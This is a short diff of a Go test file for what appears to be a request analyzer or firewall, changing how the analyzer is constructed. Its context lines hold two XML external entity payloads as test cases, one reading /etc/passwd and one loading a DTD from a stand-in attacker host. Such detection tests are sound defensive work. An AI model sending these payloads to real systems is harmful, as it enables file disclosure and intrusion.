@@ -38,7 +38,7 @@ func TestSemanticAttackGapCandidates(t *testing.T) {
 		{"xxe-xinclude", "POST", "/api/xml", "application/xml", `<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></foo>`, "xxe", nil},
 		{"xxe-param-entity", "POST", "/api/xml", "application/xml", `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/x.dtd">%xxe;]><foo/>`, "xxe", nil},
 	}
-	a := NewAnalyzer("block")
+	a := NewAnalyzer("block", 2)
 	for _, tc := range cases {
 		t.Run(tc.name, func(t *testing.T) {
 			var bodyReader *strings.Reader
